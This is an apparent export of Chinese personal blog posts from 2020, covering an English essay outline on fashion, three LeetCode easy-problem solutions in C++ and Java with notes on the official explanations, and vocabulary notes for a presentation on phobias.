<h3 id="2020-11-19"><a href="#2020-11-19" class="headerlink" title="2020-11-19"></a>2020-11-19</h3><h6 id="Topic"><a href="#Topic" class="headerlink" title="Topic:"></a>Topic:</h6><p>An increasing number of people prefer to wear fashionable clothes. Could you please analyze its possible causes and effects?</p>
<p><strong>subjective reasons:</strong></p>
<ol>
<li>好看，增加个人魅力，更能吸引别人的眼球，引起他人注意。</li>
<li>攀比心理，盲目从众。</li>
</ol>
<p><strong>objective reasons:</strong></p>
<ol>
<li>社会环境，生活氛围所迫，时尚的世纪,人们都被时尚的气息所包围.在纵多的时尚人中间…如果你仍然保持原有的纯朴…只有被伤害,被笑话</li>
</ol>
<p><strong>effects:</strong></p>
<p>advantage:</p>
<ol>
<li>可以开阔自己的视野，增加对一些奢侈品的认识</li>
<li>与朋友聊天时多一些谈资</li>
<li>与时尚的人有共同话题，认识这类朋友</li>
<li>激发自己的上进心，从而更加努力学习、工作</li>
</ol>
<p>disadvantage:</p>
<ol>
<li>一味追求时尚容易使人养成随波逐流，盲目符合的习惯</li>
<li>对于学生来讲，一味追求时尚浪费时间影响学习</li>
</ol>
<p><strong>oponion：</strong></p>
<p>每个人有每个人的追求，现在生活越来越好，追求穿衣时尚也没什么，不追求也没什么！但是一定要有限度，比如难以解决温饱却一味追求奢侈品，这是一种不明智的行为。</p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>数组拆分</title>
    <url>/2020/11/19/%E6%95%B0%E7%BB%84%E6%8B%86%E5%88%86I/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/array-partition-i/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定长度为 <code>2n</code> 的整数数组 <code>nums</code> ，你的任务是将这些数分成 <code>n</code> 对, 例如 <code>(a1, b1), (a2, b2), ..., (an, bn)</code> ，使得从 <code>1</code> 到 <code>n</code> 的 <code>min(ai, bi)</code> 总和最大。</p>
<p>返回该 <strong>最大总和</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,4,3,2]</span><br><span class="line">输出：4</span><br><span class="line">解释：所有可能的分法（忽略元素顺序）为：</span><br><span class="line">1. (1, 4), (2, 3) -&gt; min(1, 4) + min(2, 3) &#x3D; 1 + 2 &#x3D; 3</span><br><span class="line">2. (1, 3), (2, 4) -&gt; min(1, 3) + min(2, 4) &#x3D; 1 + 2 &#x3D; 3</span><br><span class="line">3. (1, 2), (3, 4) -&gt; min(1, 2) + min(3, 4) &#x3D; 1 + 3 &#x3D; 4</span><br><span class="line">所以最大总和为 4</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [6,2,6,5,1,2]</span><br><span class="line">输出：9</span><br><span class="line">解释：最优的分法为 (2, 1), (2, 5), (6, 6). min(2, 1) + min(2, 5) + min(6, 6) &#x3D; 1 + 2 + 6 &#x3D; 9</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 10^4</code></li>
<li><code>nums.length == 2 * n</code></li>
<li><code>-10^4 &lt;= nums[i] &lt;= 10^4</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目就是要把数组中的元素两两分组，尽量使每一组的最小值大一些，思考怎么分组？</p>
<p>其实就是把数组中的两个最小值分到一起，然后对剩下的元素也是挑选最小的两个值分组。</p>
<p>既然这样，只要对数组进行升序排序，然后累加偶数位置的元素值返回就好了。</p>
<p><strong>c++代码：</strong>(执行用时168ms，击败46.71%，内存消耗27.8M，击败18.66%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="keyword">int</span> n=nums.size();</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">            result+=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/array-partition-i/solution/shu-zu-chai-fen-i-by-leetcode/">官方题解</a>:</h6><p><strong>方法一 暴力求解 [超过时间限制]</strong></p>
<p><strong>算法</strong></p>
<p>最简单的解决方案是考虑 $nums$ 数组的元素每个可能的配对集。为了生成所有可能的配对，我们使用函数 <code>permute(nums,current_index)</code>。此函数创建给定数组元素的所有可能排列。</p>
<p>为此，<code>permute</code>将当前元素 <code>current_index</code>的索引作为参数之一，然后，它将当前元素与数组中的每个其他元素交换，向右移动，以便生成数组元素的新排序。在完成交换之后，它再次调用 <code>permute</code>，但这次使用数组中下一个元素的索引。返回时，我们反转当前函数调用中的交换。</p>
<p>因此，当到达数组的末尾时，会生成数组元素的新排序。考虑配对的元素，使得每对的第一个元素来自新数组的前半部分，第二个元素来自数组的后半部分。因此，我们总结了所有这些可能配对中的最小元素，并找出它们的最大总和。</p>
<p>下面的动画描述了排列的生成方式。</p>
<p><img src="/2020/11/19/%E6%95%B0%E7%BB%84%E6%8B%86%E5%88%86I/561_ArraySlide11.PNG" alt="img"></p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max_sum = Integer.MIN_VALUE;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        permute(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> max_sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">permute</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> l)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == nums.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                sum += Math.min(nums[i], nums[nums.length / <span class="number">2</span> + i]);</span><br><span class="line">            &#125;</span><br><span class="line">            max_sum = Math.max(max_sum, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt; nums.length; i++) &#123;</span><br><span class="line">            swap(nums, i, l);</span><br><span class="line">            permute(nums, l + <span class="number">1</span>);</span><br><span class="line">            swap(nums, i, l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = nums[x];</span><br><span class="line">        nums[x] = nums[y];</span><br><span class="line">        nums[y] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n!)$。对于数组中的 $n$ 元素，总共可以 $n$ 排列。</p>
</li>
<li><p>空间复杂度：$O(1)$。仅需使用常数级的额外空间。</p>
</li>
</ul>
<p><strong>方法二 排序 [通过]</strong><br><strong>算法</strong></p>
<p>为了理解这种方法，让我们从不同的角度来看待问题。我们需要形成数组元素的配对，使得这种配对中最小的总和最大。因此，我们可以查看选择配对中最小值的操作，比如 $(a,b)$ 可能会产生的最大损失 $a-b$ (如果 $a &gt; b$)。</p>
<p>如果这类配对产生的总损失最小化，那么总金额现在将达到最大值。只有当为配对选择的数字比数组的其他元素更接近彼此时，才有可能将每个配对中的损失最小化。</p>
<p>考虑到这一点，我们可以对给定数组的元素进行排序，并直接按排序顺序形成元素的配对。这将导致元素的配对，它们之间的差异最小，从而导致所需总和的最大化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>复杂度分析</p>
<ul>
<li><p>时间复杂度：$O\big(nlog(n)\big)$。排序需要 $O\big(nlog(n)\big)$的时间。另外会有一次数组的遍历。</p>
</li>
<li><p>空间复杂度：$O(1)$。仅仅需要常数级的空间.</p>
</li>
</ul>
<p><strong>方法三 使用额外的空间 [通过]</strong></p>
<p><strong>算法</strong></p>
<p>这种方法在某种程度上与排序方法有关。由于给定数组中的元素范围有限 [-10000, 10000]，我们可以使用 $arr$ 的哈希表，这样 $arr [i]$ 存储 $（i-10000）^ {th}$元素的出现频率。 这个减法操作可以保证这个哈希表可以能够存下范围内的所有数字。</p>
<p>因此，现在我们可以直接以递增的顺序遍历哈希表，而不是对数组的元素进行排序。但是，任何元素也可能在给定数组中多次出现。我们需要考虑这个因素。</p>
<p>为此，考虑一个例子：<code>nums：[a，b，a，b，b，a]</code>。这个数组的排序顺序是 <code>nums_sorted：[a，a，a，b，b，b]</code>。（我们实际上并没有在这种方法中对数组进行排序，但是排序的数组仅用于演示）。从前面的方法，我们知道所需的配对集是 （a，a），（a，b），（b，b）（a，a），（a，b），（b，b）。现在，我们可以看到，在选择最小元素时，$a$ 将被选择两次，$b$ 将仅被选择一次。发生这种情况是因为要选择的 $a$ 的数量已经由 $a$ 的频率确定，其余的地方将由 $b$ 填补。这是因为，为了得到正确的结果，我们需要按升序考虑元素。因此，较低的数字总是优先被添加到最终结果。</p>
<p>但是，如果排序的元素采用以下形式：<code>nums_sorted：[a，a，b，b，b，b]</code>，正确的配对将是 （a，a），（b，b），（b，b） ）（a，a），（b，b），（b，b））。同样，在这种情况下，所选择的$a$的数量已经预先确定，但由于 $a$ 的数量是奇数，因此它不会影响最终总和中 $b$的选择。</p>
<p>因此，基于上面的讨论，我们遍历哈希表 $arr$。如果当前元素出现 $req_i$ 次，并且其中一个元素与右边区域中的其他元素配对（考虑虚拟排序数组），我们考虑当前元素 $\left\lceil\frac{freq_i}{2}\right\rceil$次数以及数组中出现的下一个元素 $\left\lfloor\frac {freq_j}{2}\right\rfloor$最终总和的次数。为了传播这个左边对所选数字的影响，我们使用了一个标志 $d$。如果当前集合中有剩余元素将被再次考虑，则此标志设置为 1。在从下一组中选择元素时，会考虑已考虑的相同额外元素。</p>
<p>在遍历哈希表时，我们确定需要考虑每个元素的正确次数，如上所述。请注意，如果数组中不存在哈希表的当前元素，则标志 $d$ 和 $sum$保持不变。</p>
<p>下面的代码受到 @fallcreek的启发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">20001</span>];</span><br><span class="line">        <span class="keyword">int</span> lim = <span class="number">10000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums)</span><br><span class="line">            arr[num + lim]++;</span><br><span class="line">        <span class="keyword">int</span> d = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = -<span class="number">10000</span>; i &lt;= <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            sum += (arr[i + lim] + <span class="number">1</span> - d) / <span class="number">2</span> * i;</span><br><span class="line">            d = (<span class="number">2</span> + arr[i + lim] - d) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$。需要遍历一次哈希表 $arr$。</p>
</li>
<li><p>空间复杂度：。存储一个大小为$n$哈希表 $arr$ 所需要的空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解给出答案都是用Java实现的，看来写题解的是做Java的，哈哈哈。官方题解给出了三种解题思路，其中暴力求解不可用（超出时间限制且实现复杂），排序这种方法简洁易懂效率也不错，我用的也是这种方法。第三种方法“使用额外的空间”其实好像就是计数法，真的是不同的人不同的叫法，实现起来好像也挺复杂的，暂时没看懂也没仔细看，留作后续补充，太累了，顶不住了💔。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>生成每种字符都是奇数个的字符串</title>
    <url>/2020/11/19/%E7%94%9F%E6%88%90%E6%AF%8F%E7%A7%8D%E5%AD%97%E7%AC%A6%E9%83%BD%E6%98%AF%E5%A5%87%E6%95%B0%E4%B8%AA%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/generate-a-string-with-characters-that-have-odd-counts/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数 <code>n</code>，请你返回一个含 <code>n</code> 个字符的字符串，其中每种字符在该字符串中都恰好出现 <strong>奇数次</strong> 。</p>
<p>返回的字符串必须只含小写英文字母。如果存在多个满足题目要求的字符串，则返回其中任意一个即可。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4</span><br><span class="line">输出：&quot;pppz&quot;</span><br><span class="line">解释：&quot;pppz&quot; 是一个满足题目要求的字符串，因为 &#39;p&#39; 出现 3 次，且 &#39;z&#39; 出现 1 次。当然，还有很多其他字符串也满足题目要求，比如：&quot;ohhh&quot; 和 &quot;love&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2</span><br><span class="line">输出：&quot;xy&quot;</span><br><span class="line">解释：&quot;xy&quot; 是一个满足题目要求的字符串，因为 &#39;x&#39; 和 &#39;y&#39; 各出现 1 次。当然，还有很多其他字符串也满足题目要求，比如：&quot;ag&quot; 和 &quot;ur&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 7</span><br><span class="line">输出：&quot;holasss&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 500</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>只用两个不同的字母组成字符串就可以满足要求，如果n是奇数，直接返回n个‘a’组成的字符串，如果n是偶数，则返回一个‘b’和n-1个’a‘组成的字符串。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.6M，击败14.23%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">generateTheString</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//如果n是偶数，则添加一个‘b’</span></span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            result+=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">            --n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">            <span class="comment">//n或n-1个‘a’</span></span><br><span class="line">            result+=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，题目很简单，so easy！</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>移动零</title>
    <url>/2020/11/19/%E7%A7%BB%E5%8A%A8%E9%9B%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/move-zeroes/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个数组 <code>nums</code>，编写一个函数将所有 <code>0</code> 移动到数组的末尾，同时保持非零元素的相对顺序。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [0,1,0,3,12]</span><br><span class="line">输出: [1,3,12,0,0]</span><br></pre></td></tr></table></figure>
<p><strong>说明</strong>:</p>
<ol>
<li>必须在原数组上操作，不能拷贝额外的数组。</li>
<li>尽量减少操作次数。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组，删除元素0然后在末尾添加一个元素0,注意删除元素后数组元素的索引。</p>
<p><strong>c++代码：</strong>(执行用时24ms，击败10.55%，内存消耗9.1M，击败22.73%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                nums.erase(nums.begin()+i);</span><br><span class="line">                nums.emplace_back(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">//前面删除一个0</span></span><br><span class="line">                --i;</span><br><span class="line">                --n;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/move-zeroes/solution/yi-dong-ling-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：双指针</strong></p>
<p><strong>思路及解法</strong></p>
<p>使用双指针，左指针指向当前已经处理好的序列的尾部，右指针指向待处理序列的头部。</p>
<p>右指针不断向右移动，每次右指针指向非零数，则将左右指针对应的数交换，同时左指针右移。</p>
<p>注意到以下性质：</p>
<p>左指针左边均为非零数；</p>
<p>右指针左边直到左指针处均为零。</p>
<p>因此每次交换，都是将左指针的零与右指针的非零数交换，且非零数的相对顺序并未改变。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败49.15%，内存消耗9.2M，击败10.44%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size(), left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[right]) &#123;</span><br><span class="line">                swap(nums[left], nums[right]);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为序列长度。每个位置至多被遍历两次。</li>
<li>空间复杂度：$O(1)$。只需要常数的空间存放若干变量。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>自己的方法效率还是不行，vector容器删除和插入元素比较慢（需要前后元素前移或后移），优势是查找元素比较快（下表索引），所以自己使用的erase()函数和emplace_back()函数效率都不太高。而官方题解使用的是双指针还挺巧妙的，将左指针指向的零与右指针指向的非零数交换。双指针方法还挺常用的，以后多多使用吧。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>High Anxiety phobias</title>
    <url>/2020/11/19/AcademicEnglish-presentation/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>There are some materials for presentation PPT.</p>
<a id="more"></a>
<p>幽闭恐惧症</p>
<p>社交恐惧症</p>
<p>密集恐惧症（Trypophobia）<a href="https://www.verywellmind.com/trypophobia-4687678">资料</a></p>
<p>广场恐惧症</p>
<p>恐高症（acrophobia）</p>
<p>综述类型？</p>
<p>重点讲某一种类型？</p>
<h3 id="单词"><a href="#单词" class="headerlink" title="单词"></a>单词</h3><p><strong>anxiety</strong><br>英 [æŋˈzaɪəti]   美 [æŋˈzaɪəti]<br>n.<br>焦虑;忧虑;担心;害怕;渴望</p>
<p><strong>phobia</strong><br>英 [ˈfəʊbiə]   美 [ˈfoʊbiə]<br>n.<br>恐怖症，恐惧症(无名的极度恐惧);(构成名词)对…的恐惧症</p>
<p><strong>phobias</strong><br>英 [ˈfəʊbɪəz]   美 [ˈfoʊbiəz]<br>n.<br>恐怖症，恐惧症(无名的极度恐惧);(构成名词)对…的恐惧症<br>phobia的复数</p>
<p><strong>symptoms</strong><br>英 [ˈsɪmptəmz]   美 [ˈsɪmptəmz]<br>n.<br>症状;征候;征兆<br>symptom的复数</p>
<p><strong>irrational</strong><br>英 [ɪˈræʃənl]   美 [ɪˈræʃənl]<br>adj.<br>不合逻辑的;没有道理的<br>n.<br>无理数;无理性的生物</p>
<p><strong>sufferer</strong><br>英 [ˈsʌfərə(r)]   美 [ˈsʌfərər]<br>n.<br>患病者;受苦者;受难者</p>
<p>8.7%读作eight point seven percent</p>
<p><strong>exposure</strong><br>英 [ɪkˈspəʊʒə(r)]   美 [ɪkˈspoʊʒər]<br>n.<br>面临，遭受(危险或不快);揭露;(在电视、报纸等上的)亮相，被报道</p>
<p><strong>Dizziness</strong><br>英 [ˈdɪzinəs]   美 [ˈdɪzinəs]<br>晕厥;头晕;眩晕;头昏;頭暈</p>
<p><strong>Trembling</strong><br>英 [ˈtremblɪŋ]   美 [ˈtremblɪŋ]<br>颤抖;发抖;颤抖的;哆嗦;战栗</p>
<p><strong>nausea</strong><br>英 [ˈnɔːziə]   美 [ˈnɔːziə]<br>n.<br>恶心;作呕;反胃</p>
<p><strong>escalate</strong><br>英 [ˈeskəleɪt]   美 [ˈeskəleɪt]<br>v.<br>(使)逐步扩大，不断恶化，加剧</p>
<p><strong>isolate</strong><br>英 [ˈaɪsəleɪt]   美 [ˈaɪsəleɪt]<br>v.<br>(使)隔离，孤立，脱离;将…剔出(以便看清和单独处理);使(某物质、细胞等)分离;使离析</p>
<p><strong>hypochondriasis</strong></p>
<p>疑病症，</p>
<p><strong>illnesses</strong><br>英 [ˈɪlnɪsɪz]   美 [ˈɪlnəsɪz]<br>n.<br>(身体或精神上的)疾病，病;(某种)病;患病期<br>illness的复数</p>
<p><strong>imminent</strong><br>英 [ˈɪmɪnənt]   美 [ˈɪmɪnənt]<br>adj.<br>即将发生的;临近的<br>派生词： imminence n. imminently adv.</p>
<p><strong>Psychiatric</strong><br>英 [ˌsaɪkiˈætrɪk]   美 [ˌsaɪkiˈætrɪk]<br>精神医学;精神病科;精神病学;精神性;精神科</p>
